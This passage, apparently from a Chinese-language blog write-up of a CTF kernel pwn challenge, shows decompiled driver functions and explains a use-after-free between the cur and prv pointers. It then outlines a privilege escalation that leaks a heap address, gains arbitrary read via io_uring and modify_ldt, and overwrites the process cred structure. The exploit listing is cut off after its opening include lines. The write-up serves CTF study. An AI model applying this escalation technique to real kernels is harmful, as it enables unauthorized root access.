class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">hhoge_unlocked_ioctl</span><span class="params">(__int64 a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v5; <span class="comment">// r12</span></span><br><span class="line">  __int64 v6; <span class="comment">// r13</span></span><br><span class="line">  __int64 v7; <span class="comment">// r14</span></span><br><span class="line">  __int64 v8; <span class="comment">// r15</span></span><br><span class="line">  __int64 v9; <span class="comment">// rdx</span></span><br><span class="line">  Maind *maind_chunk; <span class="comment">// r13</span></span><br><span class="line">  __int64 new_chunk; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *username; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v13; <span class="comment">// rcx</span></span><br><span class="line">  _DWORD *v14; <span class="comment">// rsi</span></span><br><span class="line">  _QWORD v15[<span class="number">5</span>]; <span class="comment">// [rsp-58h] [rbp-58h] BYREF</span></span><br><span class="line">  __int64 v16; <span class="comment">// [rsp-30h] [rbp-30h]</span></span><br><span class="line">  __int64 v17; <span class="comment">// [rsp-28h] [rbp-28h]</span></span><br><span class="line">  __int64 v18; <span class="comment">// [rsp-20h] [rbp-20h]</span></span><br><span class="line">  __int64 v19; <span class="comment">// [rsp-18h] [rbp-18h]</span></span><br><span class="line">  __int64 v20; <span class="comment">// [rsp-10h] [rbp-10h]</span></span><br><span class="line">  __int64 v21; <span class="comment">// [rsp-8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v21 = v4;</span><br><span class="line">  v20 = v8;</span><br><span class="line">  v19 = v7;</span><br><span class="line">  v18 = v6;</span><br><span class="line">  v17 = v5;</span><br><span class="line">  v16 = v3;</span><br><span class="line">  maind_chunk = *(Maind **)(a1 + <span class="number">0xC8</span>);</span><br><span class="line">  v15[<span class="number">4</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( maind_chunk )</span><br><span class="line">  &#123;</span><br><span class="line">    copy_from_user(v15, v9, <span class="number">0x20</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">0x72</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      change(maind_chunk, v15);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( a2 &lt;= <span class="number">0x72</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a2 == <span class="number">0x16</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        hhoge_unlocked_ioctl_cold();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( a2 &lt;= <span class="number">0x16</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( a2 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( a2 == <span class="number">1</span> )</span><br><span class="line">            reborn_0(maind_chunk);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          printk(<span class="string">&quot;born&quot;</span>);</span><br><span class="line">          new_chunk = kmem_cache_alloc_trace(kmalloc_caches[<span class="number">5</span>], <span class="number">0xDC0</span>LL, <span class="number">0x18</span>LL);</span><br><span class="line">          username = maind_chunk-&gt;username;</span><br><span class="line">          v13 = <span class="number">8LL</span>;</span><br><span class="line">          v14 = v15;</span><br><span class="line">          maind_chunk-&gt;cur = (<span class="keyword">void</span> *)new_chunk;</span><br><span class="line">          *(_QWORD *)(new_chunk + <span class="number">8</span>) = <span class="string">&quot;ordinary&quot;</span>;</span><br><span class="line">          maind_chunk-&gt;id = <span class="number">0LL</span>;</span><br><span class="line">          <span class="keyword">while</span> ( v13 )</span><br><span class="line">          &#123;</span><br><span class="line">            *(_DWORD *)username = *v14++;</span><br><span class="line">            username += <span class="number">4</span>;</span><br><span class="line">            --v13;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在ioctl中分为了四类。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">reborn_0</span><span class="params">(Maind *context)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v2; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *cur; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rcx</span></span><br><span class="line">  _DWORD *v5; <span class="comment">// rdi</span></span><br><span class="line">  _DWORD *v6; <span class="comment">// rsi</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  printk(<span class="string">&quot;reborn&quot;</span>);</span><br><span class="line">  v2 = (<span class="keyword">void</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">5</span>], <span class="number">0xDC0</span>LL, <span class="number">0x18</span>LL);</span><br><span class="line">  cur = context-&gt;cur;</span><br><span class="line">  v4 = <span class="number">6LL</span>;</span><br><span class="line">  context-&gt;prv = v2;</span><br><span class="line">  v5 = v2;</span><br><span class="line">  v6 = cur;</span><br><span class="line">  <span class="keyword">while</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    *v5++ = *v6++;</span><br><span class="line">    --v4;</span><br><span class="line">  &#125;</span><br><span class="line">  *((_QWORD *)cur + <span class="number">1</span>) = <span class="string">&quot;unlucky&quot;</span>;</span><br><span class="line">  *((_QWORD *)context-&gt;cur + <span class="number">2</span>) = <span class="number">0xFFFFFFFFFFFE40AE</span>LL;</span><br><span class="line">  ++context-&gt;id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中的<code>reborn_0</code>函数并没有将新分配的object给到cur指针中，而是给到了<code>context-&gt;prv</code>中去了。并且会把<code>context-&gt;cur[0]</code>的内容复制到<code>context-&gt;prv[0]</code>中去。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">change_cold</span><span class="params">(Maind *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v2; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v5; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">char</span> *v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// kr08_8</span></span><br><span class="line">  _QWORD *cur; <span class="comment">// r13</span></span><br><span class="line">  __int64 v9; <span class="comment">// r15</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v10; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  printk(<span class="string">&quot;change&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = strsep((<span class="keyword">char</span> **)(v1 - <span class="number">0x38</span>), <span class="string">&quot;,&quot;</span>);</span><br><span class="line">      v5 = v4;</span><br><span class="line">      <span class="keyword">if</span> ( !v4 )</span><br><span class="line">LABEL_24:</span><br><span class="line">        JUMPOUT(<span class="number">0x132</span>LL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !*v4 );</span><br><span class="line">    v6 = <span class="built_in">strchr</span>(v4, <span class="number">0x3D</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v6 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v5 != v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      *v6 = <span class="number">0</span>;</span><br><span class="line">      v7 = <span class="built_in">strlen</span>(v6 + <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v7 - <span class="number">1</span> &lt;= <span class="number">9</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        cur = a1-&gt;cur;</span><br><span class="line">        <span class="keyword">if</span> ( !cur )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_24;</span><br><span class="line">        <span class="keyword">if</span> ( v6 != (<span class="keyword">char</span> *)<span class="number">-1LL</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v2 = kmemdup_nul(v6 + <span class="number">1</span>, v7 - <span class="number">1</span>, <span class="number">0xCC0</span>LL);</span><br><span class="line">          <span class="keyword">if</span> ( !v2 )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_24;</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_10:</span><br><span class="line">        v9 = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v10 = key_list[v9];</span><br><span class="line">          <span class="keyword">if</span> ( !v10 )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">          *(_DWORD *)(v1 - <span class="number">0x3C</span>) = v9++;</span><br><span class="line">          v11 = <span class="built_in">strcmp</span>(v10, v5);</span><br><span class="line">          v12 = *(_DWORD *)(v1 - <span class="number">0x3C</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v11 );</span><br><span class="line">        <span class="keyword">if</span> ( v12 == <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          cur[<span class="number">2</span>] += v2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( v12 &lt;= <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v12 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( v12 == <span class="number">1</span> )</span><br><span class="line">              cur[<span class="number">1</span>] = <span class="string">&quot;lucky&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            kfree(*cur);</span><br><span class="line">            *cur = v2;</span><br><span class="line">            v2 = <span class="number">0LL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_18:</span><br><span class="line">        kfree(v2);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  cur = a1-&gt;cur;</span><br><span class="line">  <span class="keyword">if</span> ( !cur )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_24;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就是<code>change</code>函数，这道题唯一难逆向的地方就在这里，仔细看其实也挺简单的，就是进行字符串对比然后进入相应的分值，其中<code>kmemdup_nul</code>函数会分配一个堆块，所以这里就是首先<code>kfree</code>掉当前<code>context-&gt;cur[0]</code>然后将新分配的堆块放进去。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">delMaind_0</span><span class="params">(Maind *context)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *cur; <span class="comment">// r14</span></span><br><span class="line">  _QWORD *prv; <span class="comment">// r13</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  printk(<span class="string">&quot;die\n&quot;</span>);</span><br><span class="line">  cur = context-&gt;cur;</span><br><span class="line">  prv = context-&gt;prv;</span><br><span class="line">  <span class="keyword">if</span> ( cur )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(*cur);</span><br><span class="line">    *cur = <span class="number">0LL</span>;</span><br><span class="line">    kfree(cur);</span><br><span class="line">    context-&gt;cur = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( prv )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(*prv);</span><br><span class="line">    *prv = <span class="number">0LL</span>;</span><br><span class="line">    kfree(prv);</span><br><span class="line">    context-&gt;prv = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  kfree(context);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数其实也就是<code>hhoge_unlocked_ioctl_cold</code>，可以看到这里会<code>kfree</code>掉的东西很多。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">hhoge_read</span><span class="params">(file *file, <span class="keyword">char</span> *ubuf, <span class="keyword">size_t</span> size, <span class="keyword">loff_t</span> *ppos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  Maind *private_data; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> *v6; <span class="comment">// r14</span></span><br><span class="line">  __int64 v7; <span class="comment">// r12</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  private_data = (Maind *)file-&gt;private_data;</span><br><span class="line">  <span class="keyword">if</span> ( !private_data )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v6 = private_data-&gt;cur;</span><br><span class="line">  <span class="keyword">if</span> ( v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = <span class="number">9LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v4 &lt;= <span class="number">9</span> )</span><br><span class="line">      v7 = v4;</span><br><span class="line">    _check_object_size(private_data-&gt;cur, v7, <span class="number">1LL</span>);</span><br><span class="line">    copy_to_user(ubuf, v6, v7);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后就是read函数，最多只允许读取9个字节的内容。可以很容易的看出来，这里可以直接读取到堆地址。</p><p>题目的漏洞很明显，如果我们使用<code>change_cold</code>函数分配一个堆块，那么此时这个堆块的地址在<code>context-&gt;cur[0]</code>中随后调用<code>reborn_0</code>函数，那么堆块地址在<code>context-&gt;prv[0]</code>中也存在了，那么如果我们再次调用<code>change_cold</code>函数的话，就会<code>kfree</code>调用<code>context-&gt;cur[0]</code>中的堆块，但是此时<code>context-&gt;prv[0]</code>指针仍然保存着目标堆块的地址，此时就形成了UAF。</p><h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p>知道了io_uring以及上面的漏洞的话利用方式就很明显了，这里可以首先利用io_uring可以随意更新内容的机制以及read可以泄漏出堆地址配合<code>modify_ldt</code>实现任意地址读，在堆区中寻在<code>task_struct</code>结构体，进而获得<code>cred</code>地址。这里需要注意的是在新版本<code>task_struct</code>在这一片区域有一点小变化：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>*<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>*<span class="title">cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line"><span class="comment">/* Cached requested key. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">cached_requested_key</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * executable name, excluding path.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * - normally initialized setup_new_exec()</span></span><br><span class="line"><span class="comment"> * - access it with [gs]et_task_comm()</span></span><br><span class="line"><span class="comment"> * - lock it with task_lock()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">char</span>comm[TASK_COMM_LEN];</span><br></pre></td></tr></table></figure><p>comm和cred中间新增了一个指针。</p><p>随后释放掉ldt结构体，让<code>ctx-&gt;buf_data-&gt;tag</code>也就是上面的<code>table</code>分配的大小为0x10，使<code>table</code>占据这个UAF的堆块。那我们可以通过ring0的<code>ctx-&gt;buf_data-&gt;tag[0]</code>也就是<code>table[0]</code>去修改ring1的<code>ctx-&gt;buf_data-&gt;tags</code>为<code>cred</code>地址，如果我们此时修改ring1的<code>ctx-&gt;buf_data-&gt;tag[0]</code>就可以修改到<code>cred</code>结构体了，完成了提权。</p><p>不熟悉上述提到的提权方式可以看一下这篇文章 <a href="https://cv196082.gitee.io/2022/08/03/kernel-pwn%E5%86%85%E5%AD%98%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%86%99%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90/">kernel pwn内存任意读写提升权限[1]</a></p><p>不熟悉<code>modify_ldt</code>的可以看一下这篇文章 <a href="https://cv196082.gitee.io/2022/08/14/modify-ldt%E5%88%A9%E7%94%A8/">modify_ldt利用</a></p><h3 id="综上可得exp"><a href="#综上可得exp" class="headerlink" title="综上可得exp"></a>综上可得exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span 